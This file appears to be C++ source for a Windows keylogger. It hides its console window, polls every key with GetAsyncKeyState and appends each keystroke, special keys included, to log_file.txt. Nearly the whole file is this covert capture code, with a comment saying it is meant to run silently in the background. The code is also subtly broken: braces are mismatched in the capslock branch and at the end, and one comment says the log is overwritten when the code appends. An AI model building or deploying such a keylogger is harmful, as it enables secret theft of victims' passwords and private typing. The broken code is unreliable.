#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <clocale>
#include <iostream>
#include <fstream>

using namespace std;

bool numlockState = GetKeyState(VK_NUMLOCK);
bool scrollLockState = GetKeyState(VK_SCROLL);
bool capslockState = GetKeyState(VK_CAPITAL);

void LOG(string input) {
	fstream LogFile;
	LogFile.open("log_file.txt", fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}


bool SpecialKeys(int S_Key) {

	switch (S_Key) {

		// F Keys
	case VK_F1:
		cout << "F1";
		LOG("F1");
		return true;
	case VK_F2:
		cout << "F2";
		LOG("F2");
		return true;
	case VK_F3:
		cout << "F3";
		LOG("F3");
		return true;
	case VK_F4:
		cout << "F4";
		LOG("F4");
		return true;
	case VK_F5:
		cout << "F5";
		LOG("F5");
		return true;
	case VK_F6:
		cout << "F6";
		LOG("F6");
		return true;
	case VK_F7:
		cout << "F7";
		LOG("F7");
		return true;
	case VK_F8:
		cout << "F8";
		LOG("F8");
		return true;
	case VK_F9:
		cout << "F9";
		LOG("F9");
		return true;
	case VK_F10:
		cout << "F10";
		LOG("F10");
		return true;
	case VK_F11:
		cout << "F11";
		LOG("F11");
		return true;
	case VK_F12:
		cout << "F12";
		LOG("F12");
		return true;

		// Scroll Lock ON/OFF
	case VK_SCROLL: // Scroll Lock (ScrLk)
		scrollLockState = !scrollLockState;
		if (scrollLockState) {
			cout << "#ScrollLock ON#";
			LOG("#ScrollLock ON#");
			return true;
		}
		else {
			cout << "#ScrollLock OFF#";
			LOG("#ScrollLock OFF#");
			return true;
		}

		// CapsLock ON/OFF
	case VK_CAPITAL: 
		capslockState = !capslockState;
		if (capslockState) {
			cout << "#CapsLock ON#";
			LOG("#CapsLock ON#");
			return true;
		}
		else {
			cout << "#CapsLock OFF#";
			LOG("#CapsLock OFF#");
			return true;
		}

		// Numlock ON/OFF
	case VK_NUMLOCK:
		numlockState = !numlockState;
		if (numlockState) {
			cout << "Numlock ON";
			LOG("Numlock ON");
			return true;
		}
		else {
			cout << "Numlock OFF";
			LOG("Numlock OFF");
			return true;
		}

		// Shift
	case VK_LSHIFT: // Left Shift
		cout << "#SHIFT(L)#";
		LOG("#SHIFT(L)#");
		return true;
	case VK_RSHIFT: // Right Shift
		cout << "#SHIFT(R)#";
		LOG("#SHIFT(R)#");
		return true;

		// Ctrl
	case VK_LCONTROL: // Left Control (Ctrl)
		cout << "#CONTROL(L)#";
		LOG("#CONTROL(L)#");
		return true;
	case VK_RCONTROL: // Right Control (Ctrl)
		cout << "#CONTROL(R)#";
		LOG("#CONTROL(R)#");
		return true;

	case VK_SPACE: // Space
		cout << " ";
		LOG(" ");
		return true;
	case VK_RWIN: // Windows
		cout << "#WINDOWS";
		LOG("#WINDOWS");
		return true;
	case VK_MULTIPLY: // * Asterisk
		cout << "*";
		LOG("*");
		return true;
	case VK_RETURN: // Enter
		cout << "\n";
		LOG("\n");
		return true;
	case VK_SUBTRACT: // - Hyphen
		cout << "-";
		LOG("-");
		return true;
	case VK_OEM_COMMA: // , Comma
		cout << ",";
		LOG(",");
		return true;
	case VK_OEM_PERIOD: // . Dot
		cout << ".";
		LOG(".");
		return true;
	case VK_DELETE: // Delete (Del)
		cout << "#DEL#";
		LOG("#DEL#");
		return true;
	case VK_BACK: // Backspace 
		cout << "#BACKSPACE#";
		LOG("#BACKSPACE#");
		return true;
	case VK_INSERT: // Insert (Ins)
		cout << "#INS#";
		LOG("#INS#");
		return true;
	case VK_TAB: // Tab
		cout << "#TAB";
		LOG("#TAB");
		return true;
	case VK_UP: // UP ARROW KEY
		cout << "#UP";
		LOG("#UP_ARROW_KEY");
		return true;
	case VK_DOWN: // DOWN ARROW KEY
		cout << "#DOWN";
		LOG("#DOWN_ARROW_KEY");
		return true;
	case VK_LEFT: // LEFT ARROW KEY
		cout << "#LEFT";
		LOG("#LEFT_ARROW_KEY");
		return true;
	case VK_RIGHT: // RIGHT ARROW KEY
		cout << "#RIGHT";
		LOG("#RIGHT_ARROW_KEY");
		return true;
	case VK_MENU: // Alt
		cout << "#ALT#";
		LOG("#ALT#");
		return true;
	case VK_ESCAPE: // Escape (Esc)
		cout << "#ESC#";
		LOG("#ESC#");
		return true;
	case VK_HOME: // Home
		cout << "#HOME#";
		LOG("#HOME#");
		return true;
	case VK_PRIOR: // Page Up (PgUp)
		cout << "#Page_Up#";
		LOG("#Page_Up#");
		return true;
	case VK_NEXT: // Page Down (PgDn)
		cout << "#Page_Down#";
		LOG("#Page_Down#");
		return true;
	case VK_END: // End
		cout << "#END#";
		LOG("#END#");
		return true;
	case VK_SNAPSHOT: // Print Screen (PrtSc)
		cout << "#ScreenPrinted#";
		LOG("#ScreenPrinted#");
		return true;
	default:
		return false;
	}
}



int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE); // Hides the console window. This helps the keylogger run silently in the background.
	char KEY = 'x';

	while (true) {
		Sleep(10); // It causes the program to wait for 10 milliseconds. This prevents the program from constantly using the CPU and improves performance.
		for (int KEY = 8; KEY <= 190; KEY++) // This loop scans ASCII character codes between 8 and 190. [8, 190]
		{
			if (GetAsyncKeyState(KEY) == -32767) { // The "GetAsyncKeyState" function is used to control the keys pressed from the keyboard. If a key is pressed, this if block runs.
				if (SpecialKeys(KEY) == false) { // This if block calls another function to control special keys (For example, Ctrl). If the key is not a special key, the operations inside will occur.
					fstream LogFile;
					LogFile.open("log_file.txt", fstream::app); // It opens the file named log_file.txt and overwrites it with new data if the file already exists.
					if (LogFile.is_open()) {
						if (capslockState == true) {
							LogFile << char(std::toupper(KEY)); // It takes the character code of the pressed key and determines the key. Then, it writes the pressed key in uppercase letters to the log_file.txt file (if it is a letter).
						else {
							LogFile << char(std::tolower(KEY)); // It takes the character code of the pressed key and determines the key. Then, it writes the pressed key in lowercase letters to the log_file.txt file (if it is a letter).
						}
						LogFile.close(); // Closes the file.
					}

				}
			}
		}
	}

	return 0;
}
}

